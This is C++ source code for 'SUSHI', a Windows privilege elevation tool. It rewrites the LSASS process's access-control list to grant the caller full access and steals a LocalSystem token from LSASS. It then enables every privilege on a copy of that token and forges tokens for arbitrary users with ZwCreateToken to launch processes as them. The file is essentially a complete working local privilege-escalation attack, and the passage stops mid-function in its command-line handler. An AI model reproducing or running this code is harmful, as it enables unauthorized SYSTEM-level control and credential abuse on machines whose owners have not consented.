/*
	SUSHI - Windows privilege elevation tool
	Placed into the public domain by DilDog (dildog@l0pht.com)

	Tested on: 
		Windows XP Professional x64 SP2
		Windows 7 x64
*/

#include<windows.h>
#include<tchar.h>
#include<stdarg.h>
#include<Ntsecapi.h>
#define SECURITY_WIN32
#include<security.h>
#include<list>
#include<Psapi.h>
#include"sushi.h"
#include"_ntdll.h"
#include"_processes.h"
#define SUSHI_LIBRARY 1	// Set this to embed SUSHI into other programs

#include"_tgetopt.h"
using namespace _TGETOPT;
#include<string>
#ifdef UNICODE
typedef std::wstring _tstring;
#else
typedef std::string _tstring;
#endif

#ifdef SUSHI_LIBRARY

CSushi::CSushi(PLOGGING_FUNCTION *plf)
	{
		m_logging_function=plf;
	}
	
int __cdecl CSushi::_tprint(const TCHAR * _Format, ...)
{
	if(!m_logging_function)
	{
		return 0;
	}

	va_list args;
	va_start(args,_Format);

	int ret=(*m_logging_function)(_Format, args);

	va_end(args);

	return ret;
}

#else
	int __cdecl _tprint(const TCHAR * _Format, ...)
	{
		va_list args;
		va_start(args,_Format);

		int ret=_vftprintf(stderr, _Format, args);

		va_end(args);

		return ret;
	}

#endif


class LsaUnicodeString: public _LSA_UNICODE_STRING
{
public:
	LsaUnicodeString( int maxSize = 512 );
	~LsaUnicodeString();
	void init( int maxSize = 512 );
	operator LSA_UNICODE_STRING *();
	operator wchar_t *();
	const LsaUnicodeString& operator=( const wchar_t *s );
};



LsaUnicodeString::LsaUnicodeString( int maxSize /* = 512 */ )
{
	Buffer = NULL;
	init( maxSize );
}



void LsaUnicodeString::init( int maxSize /* = 512 */ )
{
	if ( Buffer )
		free( Buffer );
	Length = 0;
	MaximumLength = maxSize;
	Buffer = ( maxSize == 0 )? NULL: (wchar_t *) malloc( maxSize );
	if ( Buffer )
		*Buffer = L'\0';
}



LsaUnicodeString::operator LSA_UNICODE_STRING *()
{
	return static_cast<LSA_UNICODE_STRING *>( this );
}

LsaUnicodeString::operator wchar_t *()
{
	return Buffer;
}



LsaUnicodeString::~LsaUnicodeString()
{
	if ( Buffer )
		free( Buffer );
}

const LsaUnicodeString& LsaUnicodeString::operator=( const wchar_t *s )
{
	if ( wcslen( s ) * 2 >= MaximumLength )
		init((int) wcslen( s ) ); // get new buffer
	wcscpy_s(Buffer,MaximumLength,s);
	Length = (USHORT) wcslen( s ) * 2;
	return *this;
}



bool ChangeProcessToken(DWORD dwProcessId, HANDLE hNewToken)
{
	// xxx
	
	return false;
}

struct GetPIDCallbackContext
{
	std::wstring name;
	DWORD pid;
	DWORD parentpid;
};

NTSTATUS NTAPI GetPIDEnumRoutine(PSYSTEM_PROCESS_INFORMATION CurrentProcess, PVOID CallbackContext)
{
	GetPIDCallbackContext *ctx=(GetPIDCallbackContext*)CallbackContext;

	bool bNameMatch=false;
	size_t len=ctx->name.size()*2;
	if(CurrentProcess->ImageName.Length==len && 
	   wcscmp(CurrentProcess->ImageName.Buffer,ctx->name.c_str())==0)
	{
		ctx->pid=(DWORD)CurrentProcess->ProcessId;
		return -1;
	}

	return STATUS_SUCCESS;
}

DWORD GetPID(const TCHAR *name)
{
	GetPIDCallbackContext ctx;
#ifdef _UNICODE
	ctx.name.assign(name);
#else
	std::string str(name);
	ctx.name.assign(str.begin(),str.end());
#endif
	ctx.pid=0;	
	
	NTSTATUS result;
	result=PsaEnumerateProcesses(GetPIDEnumRoutine,&ctx);
	
	if(result==-1)
	{
		return ctx.pid;
	}

	return 0;
}



bool SetKernelObjectSD_DACL(HANDLE hObject,SECURITY_DESCRIPTOR *psd)
{
	return SetKernelObjectSecurity(hObject,DACL_SECURITY_INFORMATION,psd)!=0;
}

SECURITY_DESCRIPTOR *GetKernelObjectSD_DACL(HANDLE hObject,DWORD *psdsize)
{
	DWORD sdlen=sizeof(SECURITY_DESCRIPTOR);
	SECURITY_DESCRIPTOR *psd=(SECURITY_DESCRIPTOR *)malloc(sdlen);
	if(!psd)
	{
		return NULL;
	}
	
	DWORD newsdlen;
	BOOL bSuccess;
	while(!(bSuccess=GetKernelObjectSecurity(hObject,DACL_SECURITY_INFORMATION,psd,sdlen,&newsdlen)) && 
		sdlen!=newsdlen)
	{
		SECURITY_DESCRIPTOR *newpsd=(SECURITY_DESCRIPTOR *)realloc(psd,newsdlen);
		if(!newpsd)
		{
			free(psd);
			return NULL;
		}
		psd=newpsd;
		sdlen=newsdlen;
	}
	
	DWORD abssdsize=sizeof(SECURITY_DESCRIPTOR),lastabssdsize=abssdsize;
	SECURITY_DESCRIPTOR *pabssd=(SECURITY_DESCRIPTOR *)malloc(abssdsize);
	DWORD daclsize=sizeof(ACL),lastdaclsize=daclsize;
	PACL pdacl=(PACL)malloc(daclsize);
	DWORD saclsize=sizeof(ACL),lastsaclsize=saclsize;
	PACL psacl=(PACL)malloc(saclsize);
	DWORD ownersize=sizeof(SID),lastownersize=ownersize;
	PSID powner=(PSID)malloc(ownersize);
	DWORD groupsize=sizeof(SID),lastgroupsize=groupsize;
	PSID pgroup=(PSID)malloc(groupsize);
	while(!MakeAbsoluteSD(psd,pabssd,&abssdsize,pdacl,&daclsize,psacl,&saclsize,powner,&ownersize,pgroup,&groupsize))
	{
		if(abssdsize!=lastabssdsize)
		{
			SECURITY_DESCRIPTOR *newpabssd=(SECURITY_DESCRIPTOR *)realloc(pabssd,abssdsize);
			if(!newpabssd)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pabssd=newpabssd;
			lastabssdsize=abssdsize;
		}
		if(daclsize==0)
		{
			free(pdacl);
			pdacl=NULL;
		}
		else if(daclsize!=lastdaclsize)
		{
			PACL newpdacl=(PACL)realloc(pdacl,daclsize);
			if(!newpdacl)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pdacl=newpdacl;
			lastdaclsize=daclsize;
		}
		if(saclsize==0)
		{
			free(psacl);
			psacl=NULL;
		}
		else if(saclsize!=lastsaclsize)
		{
			PACL newpsacl=(PACL)realloc(psacl,saclsize);
			if(!newpsacl)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			psacl=newpsacl;
			lastsaclsize=saclsize;
		}
		if(ownersize==0)
		{
			free(powner);
			powner=NULL;
		}
		else if(ownersize!=lastownersize)
		{
			PSID newpowner=(PSID)realloc(powner,ownersize);
			if(!newpowner)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			powner=newpowner;
			lastownersize=ownersize;
		}
		if(groupsize==0)
		{
			free(pgroup);
			pgroup=NULL;
		}
		else if(groupsize!=lastgroupsize)
		{
			PSID newpgroup=(PSID)realloc(pgroup,groupsize);
			if(!newpgroup)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pgroup=newpgroup;
			lastgroupsize=groupsize;
		}
	}

	free(psd);

	if(psdsize)
	{
		*psdsize=abssdsize;
	}
	return pabssd;
}

void FreeAbsoluteSD(SECURITY_DESCRIPTOR *psd)
{
	if(psd->Dacl)
		free(psd->Dacl);
	if(psd->Sacl)
		free(psd->Sacl);
	if(psd->Owner)
		free(psd->Owner);
	if(psd->Group)
		free(psd->Group);
	free(psd);
}

bool EditAbsolute_AddAccessAllowedAce(PACL *ppacl,DWORD dwACLRevision,DWORD dwAccessMask,PSID psid)
{
	while(!AddAccessAllowedAce(*ppacl,dwACLRevision,dwAccessMask,psid))
	{
		if(GetLastError()==ERROR_ALLOTTED_SPACE_EXCEEDED)
		{
			DWORD dwNewSize=((DWORD)(*ppacl)->AclSize)+1024;
			if(dwNewSize>=65536)
			{
				return false;
			}
			PACL newacl=(PACL) realloc((*ppacl),(WORD)dwNewSize);
			if(!newacl)
			{
				return false;
			}
			(*ppacl)=newacl;
			(*ppacl)->AclSize=(WORD)dwNewSize;
		}
		else
		{
			return false;
		}
	}

	return true;
}

PSID GetLocalSystemSID(DWORD *psidsize)
{
	SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
	PSID pSid = NULL;

	if (!AllocateAndInitializeSid(&auth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSid)) 
	{
		return NULL;
	} 
	
	DWORD dwSize = 0;
	
	SID_NAME_USE eSidtype;
	DWORD        dwNameSize   = 0;
	DWORD        dwDomainSize = 0;      
	LPTSTR       pszName      = NULL;
	LPTSTR       pszDomain    = NULL;      

	LookupAccountSid(NULL, pSid, pszName, &dwNameSize, pszDomain, &dwDomainSize, &eSidtype);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) 
	{
		pszName   = (LPTSTR)LocalAlloc(LMEM_FIXED,dwNameSize * sizeof(TCHAR));
		if(!pszName)
		{
			return NULL;
		}
		pszDomain = (LPTSTR)LocalAlloc(LMEM_FIXED,dwDomainSize * sizeof(TCHAR));
		if(!pszDomain)
		{
			LocalFree(pszName);
			return NULL;
		}
		
		if (!::LookupAccountSid(NULL, pSid, pszName, &dwNameSize, pszDomain, &dwDomainSize, &eSidtype)) 
		{
			LocalFree(pszName);
			LocalFree(pszDomain);
			return NULL;
		}
	}
	else
	{
		return NULL;
	}

	if(_tcscmp(pszDomain,_T("NT AUTHORITY"))==0 &&
	   _tcscmp(pszName,_T("SYSTEM"))==0)
	{
		LocalFree(pszName);
		LocalFree(pszDomain);
		
		if(psidsize)
		{
			*psidsize=GetLengthSid(pSid);
		}
		return pSid;
	}

	LocalFree(pszName);
	LocalFree(pszDomain);
	::FreeSid(pSid);
	return NULL;
}

PSID GetUserSID(const TCHAR *username, DWORD *psidsize)
{
	DWORD reqd_sidsize=0;
	DWORD reqd_cchReferencedDomainName=0;
	SID_NAME_USE snu;

	if(LookupAccountName(NULL,username,NULL,&reqd_sidsize,NULL,&reqd_cchReferencedDomainName,&snu))
	{
		return NULL;
	}

	PSID psid=(PSID)LocalAlloc(LMEM_FIXED,reqd_sidsize);
	if(psid==NULL)
	{
		return NULL;
	}

	TCHAR *pdomainname=(TCHAR *)LocalAlloc(LMEM_FIXED,reqd_cchReferencedDomainName*sizeof(TCHAR));
	if(pdomainname==NULL)
	{
		FreeSid(psid);
		return NULL;
	}

	if(!LookupAccountName(NULL,username,psid,&reqd_sidsize,pdomainname,&reqd_cchReferencedDomainName,&snu))
	{
		FreeSid(psid);
		LocalFree(pdomainname);
		return NULL;
	}

	LocalFree(pdomainname);

	if(psidsize!=NULL)
	{
		*psidsize=reqd_sidsize;
	}

	return psid;
}

PSID GetCurrentSID(DWORD *psidsize)
{
	//DWORD dwPID;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, GetCurrentProcessId());
	if(hProcess==NULL)
	{
		return NULL;
	}

	HANDLE hToken;
	if(!OpenProcessToken(hProcess,TOKEN_QUERY,&hToken))
	{
		CloseHandle(hProcess);
		return NULL;
	}

	DWORD tusize=(DWORD)sizeof(TOKEN_USER);
	TOKEN_USER *ptu=(TOKEN_USER *)malloc(tusize);
	DWORD dwRetLen;
	if(!GetTokenInformation(hToken, TokenUser, ptu, tusize, &dwRetLen))
	{
		tusize=dwRetLen;
		ptu=(TOKEN_USER *)realloc(ptu,dwRetLen);
		if(!GetTokenInformation(hToken, TokenUser, ptu, tusize , &dwRetLen))
		{
			CloseHandle(hToken);
			CloseHandle(hProcess);
			return NULL;
		}
	}

	DWORD len=GetLengthSid(ptu->User.Sid);
	SID *sid=(SID *)LocalAlloc(LMEM_FIXED,len);
	CopySid(len,sid,ptu->User.Sid);

	CloseHandle(hToken);
	CloseHandle(hProcess);
	free(ptu);

	return sid;
}



bool SetPrivilege(HANDLE hToken,  LPCTSTR Privilege, bool bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    TOKEN_PRIVILEGES tpPrevious;
    DWORD cbPrevious=sizeof(TOKEN_PRIVILEGES);

    if(!LookupPrivilegeValue( NULL, Privilege, &luid )) 
		return false;

    // 
    // first pass.  get current privilege setting
    // 
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = 0;

    AdjustTokenPrivileges(
            hToken,
            FALSE,
            &tp,
            sizeof(TOKEN_PRIVILEGES),
            &tpPrevious,
            &cbPrevious
            );

    if (GetLastError() != ERROR_SUCCESS) 
		return false;

    // 
    // second pass.  set privilege based on previous setting
    // 
    tpPrevious.PrivilegeCount       = 1;
    tpPrevious.Privileges[0].Luid   = luid;

    if(bEnablePrivilege) {
        tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
    }
    else {
        tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
            tpPrevious.Privileges[0].Attributes);
    }

    AdjustTokenPrivileges(
            hToken,
            FALSE,
            &tpPrevious,
            cbPrevious,
            NULL,
            NULL
            );
    if (GetLastError() != ERROR_SUCCESS) 
		return false;

    return true;
}

bool SetPrivilege( HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) 
{ 
	TOKEN_PRIVILEGES tp = { 0 }; 

	// Initialize everything to zero 
	LUID luid; 
	DWORD cb=sizeof(TOKEN_PRIVILEGES); 
	if(!LookupPrivilegeValue( NULL, Privilege, &luid ))
		return false; 

	tp.PrivilegeCount = 1; 
	tp.Privileges[0].Luid = luid; 
	if(bEnablePrivilege) 
	{ 
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	} 
	else 
	{ 
		tp.Privileges[0].Attributes = 0; 
	}

	AdjustTokenPrivileges( hToken, FALSE, &tp, cb, NULL, NULL ); 
	if (GetLastError() != ERROR_SUCCESS) 
		return false; 

	return true;
}

bool GetDebugPrivilege()
{
	HANDLE hToken;
	if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
    {
        if(GetLastError() == ERROR_NO_TOKEN)
        {
            if (!ImpersonateSelf(SecurityImpersonation))
			{
				return false;
			}

			if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
			{
				return false;
			}
		}
        else
		{
            return false;
		}
	}

    // enable SeDebugPrivilege
    if(!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
    {
        // close token handle
        CloseHandle(hToken);

        // indicate failure
        return false;
    }

    // close handles
    CloseHandle(hToken);

	return true;
}


typedef NTSTATUS (WINAPI *PFN_NT_QUERY_SYSTEM_INFORMATION)(
  IN       SYSTEM_INFORMATION_CLASS SystemInformationClass,
  IN OUT   PVOID SystemInformation,
  IN       ULONG SystemInformationLength,
  OUT OPTIONAL  PULONG ReturnLength
);


HANDLE GetLsassHandle()
{

	DWORD	dwProcessList[1024];
	DWORD	dwProcessListSize;
	HANDLE	hProcess;
	char	szProcessName[10];
	DWORD	dwCount;

	/* enumerate all pids on the system */
	if (EnumProcesses(dwProcessList, sizeof(dwProcessList), &dwProcessListSize))
	{

		/* only look in the first 256 process ids for lsass.exe */
		if (dwProcessListSize > sizeof(dwProcessList))
		{
			dwProcessListSize = sizeof(dwProcessList);
		}

		/* iterate through all pids, retrieve the executable name, and match to lsass.exe */
		for (dwCount = 0; dwCount < dwProcessListSize; dwCount++)
		{
			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessList[dwCount]))
			{
				if (GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName))
					&& strcmp(szProcessName, "lsass.exe") == 0)
				{
					return hProcess;
				}
				CloseHandle(hProcess);
			}
		}
	}
	return 0;
}

DWORD GetLsassPID()
{
	return GetPID("lsass.exe");
}


bool UnlockLSASS(LSASS_LOCK *lock)
{
	// Find LSASS
	DWORD dwLSAPID=GetLsassPID();
	if(dwLSAPID==NULL)
	{
		return false;
	}

	// Get Debug Privilege
	if(!GetDebugPrivilege())
	{
		// Don't bother failing here
	}

	// Open LSASS
	HANDLE hLSAProcess=OpenProcess(READ_CONTROL|WRITE_DAC,FALSE,dwLSAPID);
	if(hLSAProcess==NULL)
	{
		return false;
	}

	// Get process object DACL 
	DWORD sdsize;
	SECURITY_DESCRIPTOR *psd=GetKernelObjectSD_DACL(hLSAProcess,&sdsize);
	if(psd==NULL)
	{
		CloseHandle(hLSAProcess);
		return false;
	}
	
	// Get process object DACL again for backup
	DWORD sdsize_backup;
	SECURITY_DESCRIPTOR *psd_backup=GetKernelObjectSD_DACL(hLSAProcess,&sdsize_backup);
	if(psd_backup==NULL)
	{
		FreeAbsoluteSD(psd);
		CloseHandle(hLSAProcess);
		return false;
	}
	
	// Get SID for current user
	DWORD sidsize;
	PSID psid=GetCurrentSID(&sidsize);
	if(psid==NULL)
	{
		FreeAbsoluteSD(psd);
		CloseHandle(hLSAProcess);
		return false;
	}

	// Edit LSASS DACL to permit current user full access
	if(!EditAbsolute_AddAccessAllowedAce(&(psd->Dacl),ACL_REVISION,0xFFFFFFFF,psid))
	{
		FreeSid(psid);
		FreeAbsoluteSD(psd);
		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);
		return false;
	}

	// Set process object DACL 
	if(!SetKernelObjectSD_DACL(hLSAProcess,psd))
	{
		DWORD dw=GetLastError();		

		FreeSid(psid);
		FreeAbsoluteSD(psd);
		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);
		return false;
	}
	
	FreeSid(psid);
	FreeAbsoluteSD(psd);

	// Open LSASS with full permission set
	HANDLE hLSAProcessFull=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwLSAPID);
	if(hLSAProcessFull==NULL)
	{		
		// Restore LSASS process object DACL 
		if(!SetKernelObjectSD_DACL(hLSAProcess,psd_backup))
		{
			FreeAbsoluteSD(psd_backup);
			CloseHandle(hLSAProcess);
			return false;
		}

		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);

		return false;
	}

	CloseHandle(hLSAProcess);

	lock->hLSAProcess=hLSAProcessFull;
	lock->psd_backup=psd_backup;

	return true;
}

bool LockLSASS(LSASS_LOCK *lock)
{
	// Restore LSASS process object DACL 
	if(!SetKernelObjectSD_DACL(lock->hLSAProcess,lock->psd_backup))
	{
		FreeAbsoluteSD(lock->psd_backup);
		CloseHandle(lock->hLSAProcess);
		return false;
	}
	
	FreeAbsoluteSD(lock->psd_backup);
	CloseHandle(lock->hLSAProcess);
	
	memset(lock,0,sizeof(LSASS_LOCK));

	return true;
}
	
/*
void GetUserGroups(const char *user,std::list<BSTR> & groups)
{
    wchar_t widePath[256];
    _snwprintf_s(widePath,sizeof(widePath)/2,_TRUNCATE,L"WinNT://%S",user);
    
    IADsUser *pUser;
    HRESULT hr = ADsGetObject(widePath,IID_IADsUser,(void**) &pUser );
    if(FAILED(hr)) 
	{
        return;
    }

    IADsMembers *pGroups;
    hr = pUser->Groups(&pGroups);
    if(FAILED(hr)) 
	{
        return;
    }
    pUser->Release();

    IUnknown *pUnk;
    hr = pGroups->get__NewEnum(&pUnk);
    if (FAILED(hr)) {
        return;
    }
    pGroups->Release();

    IEnumVARIANT *pEnum;
    hr = pUnk->QueryInterface(IID_IEnumVARIANT,(void**)&pEnum);
    if (FAILED(hr)) {
        return;
    }
    pUnk->Release();

    BSTR bstr;
    VARIANT var;
    IADs *pADs;
    ULONG lFetch;
    IDispatch *pDisp;

    VariantInit(&var);

	hr = pEnum->Next(1, &var, &lFetch);
    while(hr == S_OK)
    {
        if (lFetch == 1)
        {
            pDisp = V_DISPATCH(&var);
            pDisp->QueryInterface(IID_IADs, (void**)&pADs);
            pADs->get_Name(&bstr);
            groups.push_back(bstr);
            SysFreeString(bstr);
            pADs->Release();
        }
        VariantClear(&var);
        hr = pEnum->Next(1, &var, &lFetch);
    };
    pEnum->Release();
}
*/

HANDLE ImpersonateSuperToken()
{
	// Get LocalSystem SID
	DWORD lssidsize;
	PSID plssid;
	plssid=GetLocalSystemSID(&lssidsize);
	if(plssid==NULL)
	{
		return NULL;
	}

	LSASS_LOCK lock;
	if(!UnlockLSASS(&lock))
	{
		FreeSid(plssid);
		return NULL;
	}

	// Find the first token for this process
	size_t dwCurHandle=0;
	HANDLE hLocalCurHandle=NULL;
	while(dwCurHandle<=0x400)
	{
		dwCurHandle+=4;
		
		if(DuplicateHandle(lock.hLSAProcess,(HANDLE)dwCurHandle,
			GetCurrentProcess(),&hLocalCurHandle,
			0,FALSE,DUPLICATE_SAME_ACCESS))
		{
			
			TOKEN_USER *ptokuser;
			DWORD tokuserlen;
			if(GetTokenInformation(hLocalCurHandle,TokenUser,NULL,0,&tokuserlen))
			{
				CloseHandle(hLocalCurHandle);
				continue;
			}
			if(tokuserlen>2048)
			{
				CloseHandle(hLocalCurHandle);
				continue;
			}
			ptokuser=(TOKEN_USER *)malloc(tokuserlen);
			if(ptokuser==NULL)
			{
				CloseHandle(hLocalCurHandle);
				continue;
			}
			if(!GetTokenInformation(hLocalCurHandle,TokenUser,ptokuser,tokuserlen,&tokuserlen))
			{
				free(ptokuser);
				CloseHandle(hLocalCurHandle);
				continue;
			}
		
			if(memcmp(ptokuser->User.Sid,plssid,sizeof(SID))==0)
			{
				free(ptokuser);
				break;
			}
			free(ptokuser);
		}
	}
		
	FreeSid(plssid);

	// Become the LSASS user for this thread
	if(!ImpersonateLoggedOnUser(hLocalCurHandle))
	{
		CloseHandle(hLocalCurHandle);

		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}
		
		return NULL;
	}

	// Duplicate this token and add all permissions to create a supertoken
	HANDLE hSuperToken;
	if(!DuplicateTokenEx(hLocalCurHandle,0,NULL,SecurityImpersonation,TokenPrimary,&hSuperToken))
	{
		RevertToSelf();	
		CloseHandle(hLocalCurHandle);

		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}

		return NULL;
	}
	
	// Modify this token to include all known permissions
	SetPrivilege(hSuperToken, SE_CREATE_TOKEN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_LOCK_MEMORY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INCREASE_QUOTA_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_UNSOLICITED_INPUT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_MACHINE_ACCOUNT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TCB_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SECURITY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TAKE_OWNERSHIP_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_LOAD_DRIVER_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEM_PROFILE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEMTIME_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_PROF_SINGLE_PROCESS_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INC_BASE_PRIORITY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_PAGEFILE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_PERMANENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_BACKUP_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_RESTORE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SHUTDOWN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_DEBUG_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_AUDIT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CHANGE_NOTIFY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_REMOTE_SHUTDOWN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_UNDOCK_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYNC_AGENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_ENABLE_DELEGATION_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_MANAGE_VOLUME_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_IMPERSONATE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_GLOBAL_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TRUSTED_CREDMAN_ACCESS_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_RELABEL_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INC_WORKING_SET_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TIME_ZONE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_SYMBOLIC_LINK_NAME, TRUE);

	if(!ImpersonateLoggedOnUser(hSuperToken))
	{
		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}
		return false;
	}

	if(!LockLSASS(&lock))
	{
		// non-fatal, but undesirable
	}

	return hSuperToken;
}

HANDLE GetUserToken(HANDLE hSuperToken, const TCHAR *username)
{
	// Get user SID
	DWORD usidsize;
	PSID usid=GetUserSID(username,&usidsize);
	if(!usid)
	{
		return NULL;
	}
	
	LUID systemluid=SYSTEM_LUID;
	TOKEN_USER user;
	user.User.Attributes=0;
	user.User.Sid=usid;

	DWORD dwRetLen;
	NTSTATUS ret;

#define QUERYTOKENINFORMATION(t,s,n)	\
	t *n;	\
	ret=ZwQueryInformationToken(hSuperToken,s,NULL,0,&dwRetLen);	\
	if(ret!=STATUS_BUFFER_TOO_SMALL)	\
	{	\
		FreeSid(usid);	\
		return NULL;	\
	}	\
	n=(t *)malloc(dwRetLen);\
	ret=ZwQueryInformationToken(hSuperToken,s,n,dwRetLen,&dwRetLen);	\
	if(!NT_SUCCESS(ret))	\
	{	\
		FreeSid(usid);	\
		return NULL;	\
	}	
	
	QUERYTOKENINFORMATION(TOKEN_STATISTICS,TokenStatistics,statistics)
	QUERYTOKENINFORMATION(TOKEN_GROUPS,TokenGroups,groups)
	QUERYTOKENINFORMATION(TOKEN_PRIVILEGES,TokenPrivileges,privileges)
	QUERYTOKENINFORMATION(TOKEN_OWNER,TokenOwner,owner)
	//QUERYTOKENINFORMATION(TOKEN_PRIMARY_GROUP,TokenPrimaryGroup,primary_group)
	QUERYTOKENINFORMATION(TOKEN_DEFAULT_DACL,TokenDefaultDacl,default_dacl)
	//QUERYTOKENINFORMATION(TOKEN_SOURCE,TokenSource,source)
	
	LUID newluid;
	AllocateLocallyUniqueId(&newluid); 

	TOKEN_SOURCE source =
       {{'*', '*', 'A', 'N', 'O', 'N', '*', '*'},
       {newluid.LowPart, newluid.HighPart}}; 

	SECURITY_QUALITY_OF_SERVICE sqos= {sizeof sqos, SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE};
	OBJECT_ATTRIBUTES oa = {sizeof oa, 0, 0, 0, 0, &sqos};


	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID PrimaryGroup;
	AllocateAndInitializeSid( &NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0,&PrimaryGroup);
	TOKEN_PRIMARY_GROUP g;
	g.PrimaryGroup=PrimaryGroup;

	HANDLE hUserToken;
	LARGE_INTEGER exptime;
	exptime.QuadPart=-1;
	ret=ZwCreateToken(&hUserToken,TOKEN_ALL_ACCESS,&oa,TokenPrimary,&systemluid,&exptime,
		&user,groups,privileges,owner,&g,default_dacl,&source);

	FreeSid(usid);
	free(statistics);
	free(groups); 
	free(privileges); 
	free(owner); 
	//free(primary_group); 
	free(default_dacl); 
	//free(source);

	if(!NT_SUCCESS(ret))
	{
		return NULL;
	}

	return hUserToken;
}

bool CreateProcessWithToken(HANDLE hToken, const wchar_t *cmdline)
{
	STARTUPINFOW si;
	memset(&si,0,sizeof(STARTUPINFOW));
	si.cb=sizeof(STARTUPINFOW);

	PROCESS_INFORMATION pi;
	
	wchar_t commandline[4096];
	wcsncpy_s(commandline,sizeof(commandline)/2,cmdline,4095);

	if(!CreateProcessAsUserW(hToken,NULL,commandline,NULL,NULL,FALSE,NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi))
	{
		DWORD dwErr=GetLastError();
		return false;
	}

	return true;
}


#ifndef SUSHI_LIBRARY
	
void help(void)
{
	_tprint(_T("[*] SUSHI - Windows privilege elevation tool\n\r")
			_T("Placed into the public domain by DilDog (dildog@l0pht.com)\n\r\n\r")
			_T("Usage: sushi -h                 this help message\n\r")
			_T("             -u <username>      choose user to execute program as\n\r")
			_T("             [command]          command line of program to execute\n\r")
			_T("       If no command line is specified, rather than launching a new process,\n\r")
			_T("       the current process will be elevated to the specified username.\n\r"));
}

int _tmain(int argc, TCHAR **argv)
{
	TCHAR *username=NULL;
	int c;
	
	opterr=0;
	while((c=_tgetopt (argc, argv, _T("hu:")))!=-1) switch (c)
	{
		case _T('h'):
			help();
			return 1;
		case 'u':
			username = optarg;
			break;
		case '?':
			if (optopt == _T('c'))
			{
				_tprint(_T("Error: no user specified. -u requires a username. Example:\n\r")
					           _T("       C:\\> sushi -u <username> \"command to execute\"\n\r")); 
			}
			else if (_istprint(optopt))
			{
				_tprint( _T("Unknown option `-%c'.\n\r"),optopt);
			}
			else
			{
				_tprint(_T("Unknown option character `\\x%x'.\n\r"),optopt);
			}
			return 2;
		default:
			return -1;
	}

	// Coalesce command line
	_tstring cmdline;
	int index;
	for(index=optind; index<argc; index++)
	{
		if(index!=optind)
		{
			cmdline.append(_T(" "));
		}
		cmdline.append(argv[index]);
	}

	// Verify command line
